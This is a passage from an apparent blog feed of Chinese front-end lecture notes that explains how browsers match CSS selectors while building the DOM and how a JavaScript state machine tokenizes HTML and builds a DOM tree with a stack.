      <url>/Blog/2019/01/30/relearn_FE/28%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%843/index/</url>
      
        <content type="html"><![CDATA[<p>在上一节课中，我已经讲了浏览器的 DOM 构建过程，但是这个构建的 DOM，实际上信息是不全的，它只有节点和属性，不包含任何的样式信息。我们这一节课就来讲讲：浏览器是如何把 CSS 规则应用到节点上，并给这棵朴素的 DOM 树添加上 CSS 属性的。</p><h2 id="整体过程"><a href="#整体过程" class="headerlink" title="整体过程"></a>整体过程</h2><p>首先 CSS 选择器这个名称，可能会给你带来一定的误解，觉得好像 CSS 规则是 DOM 树构建好了以后，再进行选择并给它添加样式的。实际上，这个过程并不是这样的。</p><p>我们回忆一下v之前的内容，浏览器会尽量流式处理整个过程。我们上一节课构建 DOM 的过程是：从父到子，从先到后，一个一个节点构造，并且挂载到 DOM 树上的，那么这个过程中，我们是否能同步把 CSS 属性计算出来呢？</p><p>答案是肯定的。</p><p>在这个过程中，我们依次拿到上一步构造好的元素，去检查它匹配到了哪些规则，再根据规则的优先级，做覆盖和调整。所以，从这个角度看，所谓的选择器，应该被理解成“匹配器”才更合适。</p><p>我在 CSS 语法部分，已经总结了选择器的各种符号，这里再把它列出来，我们回顾一下。</p><ul><li>空格: 后代，选中它的子节点和所有子节点的后代节点。</li><li>&gt;: 子代，选中它的子节点。</li><li>+：直接后继选择器，选中它的下一个相邻节点。</li><li>~：后继，选中它之后所有的相邻节点。||：列，选中表格中的一列。</li></ul><p>不知道你有没有发现，这里的选择器有个特点，那就是选择器的出现顺序，必定跟构建 DOM 树的顺序一致。这是一个 CSS 设计的原则，即保证选择器在 DOM 树构建到当前节点时，已经可以准确判断是否匹配，不需要后续节点信息。</p><p>也就是说，未来也不可能会出现“父元素选择器”这种东西，因为父元素选择器要求根据当前节点的子节点，来判断当前节点是否被选中，而父节点会先于子节点构建。</p><p>理解了 CSS 构建的大概过程，我们下面来看看具体的操作。</p><p>首先，我们必须把 CSS 规则做一下处理。作为一门语言，CSS 需要先经过词法分析和语法分析，变成计算机能够理解的结构。</p><p>这部分具体的做法属于编译原理的内容，这里就不做赘述了。我们这里假设 CSS 已经被解析成了一棵可用的抽象语法树。</p><h2 id="后代选择器-“空格”"><a href="#后代选择器-“空格”" class="headerlink" title="后代选择器 “空格”"></a>后代选择器 “空格”</h2><p>我们先来分析一下后代选择器，我们来一起看一个例子：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-id">#b</span> <span class="selector-class">.cls</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以把一个 CSS 选择器按照 compound-selector 来拆成数段，每当满足一段条件的时候，就前进一段。</p><p>比如，在上面的例子中，当我们找到了匹配 a#b 的元素时，我们才会开始检查它所有的子代是否匹配 .cls。</p><p>除了前进一段的情况，我们还需要处理后退的情况，比如，我们这样一段代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">b</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>1<span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">cls</span>&gt;</span>2<span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">cls</span>&gt;</span>3<span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当遇到 时，必须使得规则 a#b .cls 回退一步，这样第三个 span 才不会被选中。后代选择器的作用范围是父节点的所有子节点，因此规则是在匹配到本标签的结束标签时回退。</p><h2 id="后继选择器“-”"><a href="#后继选择器“-”" class="headerlink" title="后继选择器“ ~ ”"></a>后继选择器“ ~ ”</h2><p>接下来我们看下后继选择器，跟后代选择器不同的地方是，后继选择器只作用于一层，我们来看一个例子：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.cls~* &#123;</span><br><span class="line">    border:solid <span class="number">1</span>px green;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;span&gt;<span class="number">1</span>&lt;span&gt;</span><br><span class="line">  &lt;span <span class="keyword">class</span>=<span class="symbol">cls</span>&gt;<span class="symbol">2</span>&lt;<span class="symbol">span</span>&gt;</span><br><span class="line">  &lt;<span class="symbol">span</span>&gt;</span><br><span class="line">      <span class="symbol">3</span></span><br><span class="line">      &lt;<span class="symbol">span</span>&gt;<span class="symbol">4</span>&lt;/<span class="symbol">span</span>&gt;</span><br><span class="line">  &lt;<span class="symbol">span</span>&gt;</span><br><span class="line">  &lt;<span class="symbol">span</span>&gt;<span class="symbol">5</span>&lt;/<span class="symbol">span</span>&gt;</span><br><span class="line">&lt;/<span class="symbol">div</span>&gt;</span><br></pre></td></tr></table></figure><p>这里 .cls 选中了 span 2 然后 span 3 是它的后继，但是 span 3 的子节点 span 4 并不应该被选中，而 span 5 也是它的后继，因此应该被选中。</p><p>按照 DOM 树的构造顺序，4 在 3 和 5 中间，我们就没有办法像前面讲的后代选择器一样通过激活或者关闭规则来实现匹配。</p><p>但是这里有个非常方便的思路，就是给选择器的激活，带上一个条件：父元素。</p><p>注意，这里后继选择器，当前半段的 .cls 匹配成功时，后续 * 所匹配的所有元素的父元素都已经确定了（后继节点和当前节点父元素相同是充分必要条件）。在我们的例子中，那个 div 就是后继节点的父元素。</p><h2 id="子代选择器“-gt-”"><a href="#子代选择器“-gt-”" class="headerlink" title="子代选择器“ &gt;”"></a>子代选择器“ &gt;”</h2><p>我们继续看，子代选择器是如何实现的。</p><p>实际上，有了前面讲的父元素这个约束思路，我们很容易实现子代选择器。区别仅仅是拿当前节点作为父元素，还是拿当前节点的父元素作为父元素。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">div&gt;.cls &#123;</span><br><span class="line">    border:solid <span class="number">1</span>px green;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;span&gt;<span class="number">1</span>&lt;span&gt;</span><br><span class="line">&lt;span <span class="keyword">class</span>=<span class="symbol">cls</span>&gt;<span class="symbol">2</span>&lt;<span class="symbol">span</span>&gt;</span><br><span class="line">&lt;<span class="symbol">span</span>&gt;</span><br><span class="line">    <span class="symbol">3</span></span><br><span class="line">    &lt;<span class="symbol">span</span>&gt;<span class="symbol">4</span>&lt;/<span class="symbol">span</span>&gt;</span><br><span class="line">&lt;<span class="symbol">span</span>&gt;</span><br><span class="line">&lt;<span class="symbol">span</span>&gt;<span class="symbol">5</span>&lt;/<span class="symbol">span</span>&gt;</span><br><span class="line">&lt;/<span class="symbol">div</span>&gt;</span><br></pre></td></tr></table></figure><p>我们看这段代码，当 DOM 树构造到 div 时，匹配了 CSS 规则的第一段，因为是子代选择器，我们激活后面的 .cls 选择条件，并且指定父元素必须是当前 div。于是后续的构建 DOM 树构建过程中，span 2 就被选中了。</p><h2 id="直接后继选择器“-”"><a href="#直接后继选择器“-”" class="headerlink" title="直接后继选择器“ +”"></a>直接后继选择器“ +”</h2><p>直接后继选择器的实现是上述中最为简单的了，因为它只对唯一一个元素生效，所以不需要像前面几种一样反复激活和关闭规则。</p><p>一个最简单的思路是，我们可以把它当作检查元素自身的选择器来处理。即我们把 #id+.cls 都当做检查某一个元素的选择器。</p><h2 id="列选择器“-”"><a href="#列选择器“-”" class="headerlink" title="列选择器“ || ”"></a>列选择器“ || ”</h2><p>列选择器比较特别，它是专门针对表格的选择器，跟表格的模型建立相关，我们这里不详细讲了。</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>我们不要忘记，CSS 选择器还支持逗号分隔，表示“或”的关系。这里最简单的实现是把逗号视为两条规则的一种简易写法。</p><p>比如：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-id">#b</span>, <span class="selector-class">.cls</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们当作两条规则来处理：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/* 1 */</span></span><br><span class="line">a<span class="comment">#b &#123;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="regexp">/* 1 */</span></span><br><span class="line">.cls &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个情况，就是选择器可能有重合，这样，我们可以使用树形结构来进行一些合并，来提高效率：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#a</span> <span class="selector-class">.cls</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#a</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#a</span>&gt;<span class="selector-tag">span</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里实际上可以把选择器构造成一棵树：</p><ul><li>#a<ul><li>&lt; 空格 &gt;.cls</li><li>&lt; 空格 &gt;span</li><li>&gt;span</li></ul></li></ul><p>需要注意的是，这里的树，必须要带上连接符。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>27丨浏览器：一个浏览器是如何工作的2</title>
      <link href="/Blog/2019/01/30/relearn_FE/27%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%842/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/27%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%842/index/</url>
      
        <content type="html"><![CDATA[<p>今天我们主要来看两个过程：如何解析请求回来的 HTML 代码，DOM 树又是如何构建的。</p><p><img src="/Blog/2019/01/30/relearn_FE/27%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%842/index/img.png"></p><h2 id="解析代码"><a href="#解析代码" class="headerlink" title="解析代码"></a>解析代码</h2><p>我们在前面讲到了 HTTP 的构成，但是我们有一部分没有详细讲解，那就是 Response 的 body 部分，这正是因为 HTTP 的 Response 的 body，就要交给我们今天学习的内容去处理了。</p><p>HTML 的结构不算太复杂，我们日常开发需要的 90% 的“词”（指编译原理的术语 token，表示最小的有意义的单元），种类大约只有标签开始、属性、标签结束、注释、CDATA 节点几种。</p><p>实际上有点麻烦的是，由于 HTML 跟 SGML 的千丝万缕的联系，我们需要做不少容错处理。“&lt;?”和“&lt;%”什么的也是必须要支持好的，报了错也不能吭声。</p><h3 id="1-词（token）是如何被拆分的"><a href="#1-词（token）是如何被拆分的" class="headerlink" title="1. 词（token）是如何被拆分的"></a>1. 词（token）是如何被拆分的</h3><p>首先我们来看看一个非常标准的标签，会被如何拆分：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p <span class="keyword">class</span>=&quot;<span class="symbol">a</span>&quot;&gt;<span class="symbol">text</span> <span class="symbol">text</span> <span class="symbol">text</span>&lt;/<span class="symbol">p</span>&gt;</span><br></pre></td></tr></table></figure><p>如果我们从最小有意义单元的定义来拆分，第一个词（token）是什么呢？显然，作为一个词（token），整个 p 标签肯定是过大了（它甚至可以嵌套）。</p><p>那么，只用 p 标签的开头是不是合适吗？我们考虑到起始标签也是会包含属性的，最小的意义单元其实是“&lt;p” ，所以“ &lt;p” 就是我们的第一个词（token）。</p><p>我们继续拆分，可以把这段代码依次拆成词（token）：</p><ul><li>&lt;p“标签开始”的开始；</li><li>class&#x3D;“a” 属性；</li><li>&gt;  “标签开始”的结束；</li><li>text text text 文本；</li><li>&lt;/p&gt; 标签结束。</li></ul><p>这是一段最简单的例子，类似的还有什么呢？现在我们可以来来看看这些词（token）长成啥样子：</p><p><img src="/Blog/2019/01/30/relearn_FE/27%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%842/index/img_1.png"></p><p>根据这样的分析，现在我们讲讲浏览器是如何用代码实现，我们设想，代码开始从 HTTP 协议收到的字符流读取字符。</p><p>在接受第一个字符之前，我们完全无法判断这是哪一个词（token），不过，随着我们接受的字符越来越多，拼出其他的内容可能性就越来越少。</p><p>比如，假设我们接受了一个字符“ &lt; ” 我们一下子就知道这不是一个文本节点啦。</p><p>之后我们再读一个字符，比如就是 x，那么我们一下子就知道这不是注释和 CDATA 了，接下来我们就一直读，直到遇到“&gt;”或者空格，这样就得到了一个完整的词（token）了。</p><p>实际上，我们每读入一个字符，其实都要做一次决策，而且这些决定是跟“当前状态”有关的。在这样的条件下，浏览器工程师要想实现把字符流解析成词（token），最常见的方案就是使用状态机。</p><h3 id="2-状态机"><a href="#2-状态机" class="headerlink" title="2. 状态机"></a>2. 状态机</h3><p>绝大多数语言的词法部分都是用状态机实现的。那么我们来把部分词（token）的解析画成一个状态机看看：</p><p><img src="/Blog/2019/01/30/relearn_FE/27%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%842/index/img_2.png"></p><p>当然了，我们这里的分析比较粗略，真正完整的 HTML 词法状态机，比我们描述的要复杂的多。更详细的内容，你可以参考<a href="https://html.spec.whatwg.org/multipage/parsing.html#tokenization">HTML 官方文档</a>，HTML 官方文档规定了 80 个状态（顺便一说，HTML 是我见过唯一一个标准中规定了状态机实现的语言，对大部分语言来说，状态机是一种实现而非定义）。</p><p>这里我们为了理解原理，用这个简单的状态机就足够说明问题了。</p><p>状态机的初始状态，我们仅仅区分 “&lt; ”和 “非 &lt;”：</p><ul><li>如果获得的是一个非 &lt; 字符，那么可以认为进入了一个文本节点；</li><li>如果获得的是一个 &lt; 字符，那么进入一个标签状态。</li></ul><p>不过当我们在标签状态时，则会面临着一些可能性。</p><ul><li>比如下一个字符是“ ! ” ，那么很可能是进入了注释节点或者 CDATA 节点。</li><li>如果下一个字符是 “&#x2F; ”，那么可以确定进入了一个结束标签。</li><li>如果下一个字符是字母，那么可以确定进入了一个开始标签。</li><li>如果我们要完整处理各种 HTML 标准中定义的东西，那么还要考虑“ ? ”“% ”等内容。</li></ul><p>我们可以看到，用状态机做词法分析，其实正是把每个词的“特征字符”逐个拆开成独立状态，然后再把所有词的特征字符链合并起来，形成一个联通图结构。</p><p>由于状态机设计属于编译原理的基本知识，这里我们仅作一个简要的介绍。</p><p>接下来就是代码实现的事情了，在 C&#x2F;C++ 和 JavaScript 中，实现状态机的方式大同小异：我们把每个函数当做一个状态，参数是接受的字符，返回值是下一个状态函数。（这里我希望再次强调下，状态机真的是一种没有办法封装的东西，所以我们永远不要试图封装状态机。）</p><p>为了方便理解和试验，我们这里用 JavaScript 来讲解，图上的 data 状态大概就像下面这样的：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">var data <span class="operator">=</span> function(c)&#123;</span><br><span class="line">    if(c<span class="operator">=</span><span class="operator">=</span><span class="string">&quot;&amp;&quot;</span>) &#123;</span><br><span class="line">        return characterReferenceInData<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    if(c<span class="operator">=</span><span class="operator">=</span><span class="string">&quot;&lt;&quot;</span>) &#123;</span><br><span class="line">        return tagOpen<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    else if(c<span class="operator">=</span><span class="operator">=</span><span class="string">&quot;\0&quot;</span>) &#123;</span><br><span class="line">        error()<span class="comment">;</span></span><br><span class="line">        emitToken(c)<span class="comment">;</span></span><br><span class="line">        return data<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    else if(c<span class="operator">=</span><span class="operator">=</span>EOF) &#123;</span><br><span class="line">        emitToken(EOF)<span class="comment">;</span></span><br><span class="line">        return data<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        emitToken(c)<span class="comment">;</span></span><br><span class="line">        return data<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line">var tagOpenState <span class="operator">=</span> function tagOpenState(c)&#123;</span><br><span class="line">    if(c<span class="operator">=</span><span class="operator">=</span><span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        return endTagOpenState<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    if(c.match(/[A-Z]/)) &#123;</span><br><span class="line">        token <span class="operator">=</span> new StartTagToken()<span class="comment">;</span></span><br><span class="line">        token.name <span class="operator">=</span> c.toLowerCase()<span class="comment">;</span></span><br><span class="line">        return tagNameState<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    if(c.match(/[a-z]/)) &#123;</span><br><span class="line">        token <span class="operator">=</span> new StartTagToken()<span class="comment">;</span></span><br><span class="line">        token.name <span class="operator">=</span> c<span class="comment">;</span></span><br><span class="line">        return tagNameState<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    if(c<span class="operator">=</span><span class="operator">=</span><span class="string">&quot;?&quot;</span>) &#123;</span><br><span class="line">        return bogusCommentState<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        error()<span class="comment">;</span></span><br><span class="line">        return dataState<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line">//……</span><br></pre></td></tr></table></figure><p>这段代码给出了状态机的两个状态示例：data 即为初始状态，tagOpenState 是接受了一个“ &lt; ” 字符，来判断标签类型的状态。</p><p>这里的状态机，每一个状态是一个函数，通过“if else”来区分下一个字符做状态迁移。这里所谓的状态迁移，就是当前状态函数返回下一个状态函数。</p><p>这样，我们的状态迁移代码非常的简单：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var <span class="keyword">state</span> = data;</span><br><span class="line">var char</span><br><span class="line">while(char = getInput())</span><br><span class="line">    <span class="keyword">state</span> = <span class="keyword">state</span>(char);</span><br></pre></td></tr></table></figure><p>这段代码的关键一句是“ state &#x3D; state(char) ”，不论我们用何种方式来读取字符串流，我们都可以通过 state 来处理输入的字符流，这里用循环是一个示例，真实场景中，可能是来自 TCP 的输出流。</p><p>状态函数通过代码中的 emitToken 函数来输出解析好的 token（词），我们只需要覆盖 emitToken，即可指定对解析结果的处理方式。</p><p>词法分析器接受字符的方式很简单，就像下面这样：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function HTMLLexicalParser()&#123;</span><br><span class="line"></span><br><span class="line">    //状态函数们……</span><br><span class="line">    function data() &#123;</span><br><span class="line">        // ……</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="keyword">tag</span>Open() &#123;</span><br><span class="line">        // ……</span><br><span class="line">    &#125;</span><br><span class="line">    // ……</span><br><span class="line">    var <span class="keyword">state</span> = data;</span><br><span class="line">    this.receiveInput = function(char) &#123;</span><br><span class="line">        <span class="keyword">state</span> = <span class="keyword">state</span>(char);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我们就把字符流拆成了词（token）了。</p><h2 id="构建-DOM-树"><a href="#构建-DOM-树" class="headerlink" title="构建 DOM 树"></a>构建 DOM 树</h2><p>接下来我们要把这些简单的词变成 DOM 树，这个过程我们是使用栈来实现的，任何语言几乎都有栈，为了给你跑着玩，我们还是用 JavaScript 来实现吧，毕竟 JavaScript 中的栈只要用数组就好了。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">HTMLSyntaticalParser</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> stack = [<span class="keyword">new</span> HTMLDocument];</span><br><span class="line">    <span class="keyword">this</span>.receiveInput = <span class="keyword">function</span><span class="params">(token)</span> &#123;</span><br><span class="line">        <span class="comment">//……</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.getOutput = <span class="keyword">function</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stack[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们这样来设计 HTML 的语法分析器，receiveInput 负责接收词法部分产生的词（token），通常可以由 emitToken 来调用。</p><p>在接收的同时，即开始构建 DOM 树，所以我们的主要构建 DOM 树的算法，就写在 receiveInput 当中。当接收完所有输入，栈顶就是最后的根节点，我们 DOM 树的产出，就是这个 stack 的第一项。</p><p>为了构建 DOM 树，我们需要一个 Node 类，接下来我们所有的节点都会是这个 Node 类的实例。</p><p>在完全符合标准的浏览器中，不一样的 HTML 节点对应了不同的 Node 的子类，我们为了简化，就不完整实现这个继承体系了。我们仅仅把 Node 分为 Element 和 Text（如果是基于类的 OOP 的话，我们还需要抽象工厂来创建对象），</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Element</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.childNodes = [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Text</span><span class="params">(value)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.value = value || <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面我们的词（token）中，以下两个是需要成对匹配的：</p><ul><li>tag start</li><li>tag end</li></ul><p>根据一些编译原理中常见的技巧，我们使用的栈正是用于匹配开始和结束标签的方案。</p><p>对于 Text 节点，我们则需要把相邻的 Text 节点合并起来，我们的做法是当词（token）入栈时，检查栈顶是否是 Text 节点，如果是的话就合并 Text 节点。</p><p>同样我们来看看直观的解析过程：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">maaa</span>=<span class="string">a</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>cool<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;a&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过这个栈，我们可以构建 DOM 树：</p><ul><li>栈顶元素就是当前节点；</li><li>遇到属性，就添加到当前节点；</li><li>遇到文本节点，如果当前节点是文本节点，则跟文本节点合并，否则入栈成为当前节点的子节点；</li><li>遇到注释节点，作为当前节点的子节点；</li><li>遇到 tag start 就入栈一个节点，当前节点就是这个节点的父节点；</li><li>遇到 tag end 就出栈一个节点（还可以检查是否匹配）。</li></ul><p>用一个 gif 来看看上述过程</p><p><img src="/Blog/2019/01/30/relearn_FE/27%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%842/index/img.gif"></p><p>当我们的源代码完全遵循 XHTML（这是一种比较严谨的 HTML 语法）时，这非常简单问题，然而 HTML 具有很强的容错能力，奥妙在于当 tag end 跟栈顶的 start tag 不匹配的时候如何处理。</p><p>于是，这又有一个极其复杂的规则，幸好 W3C 又一次很贴心地把全部规则都整理地很好，我们只要翻译成对应的代码就好了，以下这个网站呈现了全部规则。你可以点击查看。</p><p><a href="http://www.w3.org/html/wg/drafts/html/master/syntax.html#tree-construction">http://www.w3.org/html/wg/drafts/html/master/syntax.html#tree-construction</a></p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>26丨浏览器：一个浏览器是如何工作的1</title>
      <link href="/Blog/2019/01/30/relearn_FE/26%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%841/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/26%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%841/index/</url>
      
